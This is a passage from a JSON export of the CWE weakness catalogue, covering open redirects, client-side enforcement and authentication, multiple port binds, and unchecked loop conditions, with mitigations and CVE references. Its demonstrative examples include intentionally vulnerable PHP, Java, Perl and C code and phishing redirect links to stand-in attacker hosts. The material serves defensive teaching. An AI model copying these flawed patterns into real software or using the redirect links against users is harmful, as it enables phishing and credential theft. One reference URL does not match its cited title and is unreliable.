          "Note": "The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data."
        },
        {
          "Scope": [
            "Access Control",
            "Confidentiality",
            "Other"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity",
            "Other"
          ],
          "Note": "The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-10",
          "Method": "Manual Static Analysis",
          "Description": "Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Dynamic Analysis",
          "Description": "Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected."
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives."
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "High"
        },
        {
          "Method": "Dynamic Analysis with Automated Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners",
          "Effectiveness": "High"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-5",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nUse a list of approved URLs or domains to be used for redirection.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page."
        },
        {
          "MitigationID": "MIT-21.2",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Enforcement by Conversion",
          "Description": "\n\nWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.\n\n\nFor example, ID 1 could map to \"/login.asp\" and ID 2 could map to \"http://www.example.com/\". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application [REF-483]. Be sure that the nonce is not predictable (CWE-330).",
          "EffectivenessNotes": "Note that this can be bypassed using XSS (CWE-79)."
        },
        {
          "MitigationID": "MIT-6",
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\n\n\nMany open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.\n"
        },
        {
          "MitigationID": "MIT-29",
          "Phase": [
            "Operation"
          ],
          "Strategy": "Firewall",
          "Description": "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code obtains a URL from the query string and then redirects the user to that URL."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$redirect_url = $_GET['url'];\n\theader(\"Location: \" . $redirect_url);\n```"
            },
            {
              "BodyText": "The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\thttp://example.com/example.php?url=http://malicious.example.com\n```"
            },
            {
              "BodyText": "The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place."
            }
          ]
        },
        {
          "ID": "DX-194",
          "Entries": [
            {
              "IntroText": "The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class RedirectServlet extends HttpServlet {\n\t\t\tprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\t\t\t\tString query = request.getQueryString();\n\t\t\t\tif (query.contains(\"url\")) {\n\t\t\t\t\tString url = request.getParameter(\"url\");\n\t\t\t\t\tresponse.sendRedirect(url);\n\t\t\t\t}\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of an e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:"
            },
            {
              "Nature": "Attack",
              "Language": "HTML",
              "ExampleCode": "```\n\t<a href=\"http://bank.example.com/redirect?url=http://attacker.example.net\">Click here to log in</a>\n```"
            },
            {
              "BodyText": "The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-4206",
          "Description": "URL parameter loads the URL into a frame and causes it to appear to be part of a valid page.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4206"
        },
        {
          "Reference": "CVE-2008-2951",
          "Description": "An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2951"
        },
        {
          "Reference": "CVE-2008-2052",
          "Description": "Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2052"
        },
        {
          "Reference": "CVE-2020-11053",
          "Description": "Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-11053"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "38",
          "EntryName": "URl Redirector Abuse"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "RelatedAttackPatterns": [
        "178"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-483",
          "Authors": [
            "Craig A. Shue",
            "Andrew J. Kalafut",
            "Minaxi Gupta"
          ],
          "Title": "Exploitable Redirects on the Web: Identification, Prevalence, and Defense",
          "URL": "https://www.cprogramming.com/tutorial/exceptions.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-484",
          "Section": "Page 43",
          "Authors": [
            "Russ McRee"
          ],
          "Title": "Open redirect vulnerabilities: definition and prevention",
          "Edition": "Issue 17",
          "Publication": "(IN)SECURE",
          "PublicationYear": "2008",
          "PublicationMonth": "07",
          "URL": "http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf"
        },
        {
          "ExternalReferenceID": "REF-485",
          "Authors": [
            "Jason Lam"
          ],
          "Title": "Top 25 Series - Rank 23 - Open Redirect",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "25",
          "Publisher": "SANS Software Security Institute",
          "URL": "http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect"
        },
        {
          "ExternalReferenceID": "REF-45",
          "Authors": [
            "OWASP"
          ],
          "Title": "OWASP Enterprise Security API (ESAPI) Project",
          "URL": "http://www.owasp.org/index.php/ESAPI"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "602",
      "Name": "Client-Side Enforcement of Server-Side Security",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.",
      "ExtendedDescription": "When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms, resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "471",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "290",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "300",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Mobile",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Architecture and Design",
          "Note": "Consider a product that consists of two or more processes or nodes that must interact closely, such as a client/server model. If the product uses protection schemes in the client in order to defend from attacks against the server, and the server does not use the same schemes, then an attacker could modify the client in a way that bypasses those schemes. This is a fundamental design flaw that is primary to many weaknesses."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control",
            "Availability"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Client-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "Client-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.\n\n\nEven though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "If some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This example contains client-side code that checks if the user authenticated successfully before sending a command. The server-side code performs the authentication in one step, and executes the command in a separate step."
            },
            {
              "BodyText": "CLIENT-SIDE (client.pl)"
            },
            {
              "Nature": "Good",
              "Language": "Perl",
              "ExampleCode": "```\n\t$server = \"server.example.com\";\n\t$username = AskForUserName();\n\t$password = AskForPassword();\n\t$address = AskForAddress();\n\t$sock = OpenSocket($server, 1234);\n\twriteSocket($sock, \"AUTH $username $password\\n\");\n\t$resp = readSocket($sock);\n\tif ($resp eq \"success\") {\n```\n# username/pass is valid, go ahead and update the info!* \n\t\t\twriteSocket($sock, \"CHANGE-ADDRESS $username $address\\n\";}\n\telse {\n\t```\n\t\tprint \"ERROR: Invalid Authentication!\\n\";\n\t}\n```"
            },
            {
              "BodyText": "SERVER-SIDE (server.pl):"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\t$sock = acceptSocket(1234);\n\t($cmd, $args) = ParseClientRequest($sock);\n\tif ($cmd eq \"AUTH\") {\n\t\t\t($username, $pass) = split(/\\s+/, $args, 2);\n\t\t\t$result = AuthenticateUser($username, $pass);\n\t\t\twriteSocket($sock, \"$result\\n\");\n```\n# does not close the socket on failure; assumes the* \n\t\t\t\n\t\t\t\n\t\t\t *# user will try again* \n\t\t\t}\n\telsif ($cmd eq \"CHANGE-ADDRESS\") {\n\t```\n\t\tif (validateAddress($args)) {\n\t\t\t$res = UpdateDatabaseRecord($username, \"address\", $args);\n\t\t\twriteSocket($sock, \"SUCCESS\\n\");\n\t\t}\n\t\telse {\n\t\t\twriteSocket($sock, \"FAILURE -- address is malformed\\n\");\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The server accepts 2 commands, \"AUTH\" which authenticates the user, and \"CHANGE-ADDRESS\" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the \"AUTH\" command and simply executing the CHANGE-ADDRESS."
            }
          ]
        },
        {
          "ID": "DX-153",
          "Entries": [
            {
              "IntroText": "In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were \"insecure by design\" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications."
            },
            {
              "BodyText": "Multiple vendors used client-side authentication in their OT products."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-33139",
          "Description": "SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-33139"
        },
        {
          "Reference": "CVE-2006-6994",
          "Description": "ASP program allows upload of .asp files by bypassing client-side checks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6994"
        },
        {
          "Reference": "CVE-2007-0163",
          "Description": "steganography products embed password information in the carrier file, which can be extracted from a modified client.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0163"
        },
        {
          "Reference": "CVE-2007-0164",
          "Description": "steganography products embed password information in the carrier file, which can be extracted from a modified client.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0164"
        },
        {
          "Reference": "CVE-2007-0100",
          "Description": "client allows server to modify client's configuration and overwrite arbitrary files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0100"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A1",
          "EntryName": "Unvalidated Input",
          "MappingFit": "CWE More Specific"
        }
      ],
      "RelatedAttackPatterns": [
        "162",
        "202",
        "207",
        "208",
        "21",
        "31",
        "383",
        "384",
        "385",
        "386",
        "387",
        "388"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 23, \"Client-Side Security Is an Oxymoron\" Page 687",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-1283",
          "Authors": [
            "Forescout Vedere Labs"
          ],
          "Title": "OT:ICEFALL: The legacy of \"insecure by design\" and its implications for certifications and risk management",
          "PublicationYear": "2022",
          "PublicationMonth": "06",
          "PublicationDay": "20",
          "URL": "https://www.forescout.com/resources/ot-icefall-report/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "603",
      "Name": "Use of Client-Side Authentication",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.",
      "ExtendedDescription": "Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1390",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "602",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "300",
          "ViewID": "1000"
        },
        {
          "Nature": "PeerOf",
          "CweID": "656",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not rely on client side data. Always perform server side authentication."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-153",
          "Entries": [
            {
              "IntroText": "In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were \"insecure by design\" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications."
            },
            {
              "BodyText": "Multiple vendors used client-side authentication in their OT products."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-33139",
          "Description": "SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-33139"
        },
        {
          "Reference": "CVE-2006-0230",
          "Description": "Client-side check for a password allows access to a server using crafted XML requests from a modified client.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-0230"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 2, \"Untrustworthy Credentials\", Page 37",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        },
        {
          "ExternalReferenceID": "REF-1283",
          "Authors": [
            "Forescout Vedere Labs"
          ],
          "Title": "OT:ICEFALL: The legacy of \"insecure by design\" and its implications for certifications and risk management",
          "PublicationYear": "2022",
          "PublicationMonth": "06",
          "PublicationDay": "20",
          "URL": "https://www.forescout.com/resources/ot-icefall-report/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "605",
      "Name": "Multiple Binds to the Same Port",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.",
      "ExtendedDescription": "On most systems, a combination of setting the SO_REUSEADDR socket option, and a call to bind() allows any process to bind to a port to which a previous process has bound with INADDR_ANY. This allows a user to bind to the specific address of a server bound to INADDR_ANY on an unprivileged port, and steal its UDP packets/TCP connection.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "675",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "666",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "Packets from a variety of network services may be stolen or the services spoofed."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Policy"
          ],
          "Description": "Restrict server socket address to known local addresses."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-184",
          "Entries": [
            {
              "IntroText": "This code binds a server socket to port 21, allowing the server to listen for traffic on that port."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid bind_socket(void) {\n\t\t\tint server_sockfd;\n\t\t\tint server_len;\n\t\t\tstruct sockaddr_in server_address;\n```\n/*unlink the socket if already bound to avoid an error when bind() is called*/* \n\t\t\t\n\t\t\tunlink(\"server_socket\");\n\t\t\tserver_sockfd = socket(AF_INET, SOCK_STREAM, 0);\n\t\t\t\n\t\t\tserver_address.sin_family = AF_INET;\n\t\t\tserver_address.sin_port = 21;\n\t\t\tserver_address.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\t\tserver_len = sizeof(struct sockaddr_in);\n\t\t\t\n\t\t\tbind(server_sockfd, (struct sockaddr *) &s1, server_len);}"
            },
            {
              "BodyText": "This code may result in two servers binding a socket to same port, thus receiving each other's traffic. This could be used by an attacker to steal packets meant for another process, such as a secure FTP server."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP32",
          "EntryName": "Multiple binds to the same port"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "606",
      "Name": "Unchecked Input for Loop Condition",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service or other consequences because of excessive looping.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1284",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "834",
          "ViewID": "1000"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Resource Consumption (CPU)"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Do not use user-controlled data for loop conditions."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Perform input validation."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example demonstrates the weakness."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid iterate(int n){\n\t\tint i;\n\t\tfor (i = 0; i < n; i++){\n\t\t\tfoo();\n\t\t}\n\t}\n\tvoid iterateFoo()\n\t{\n\t\tunsigned int num;\n\t\tscanf(\"%u\",&num);\n\t\titerate(num);\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-91",
          "Entries": [
            {
              "IntroText": "In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing."
            },
            {
              "Nature": "Bad",
              "Language": "C",
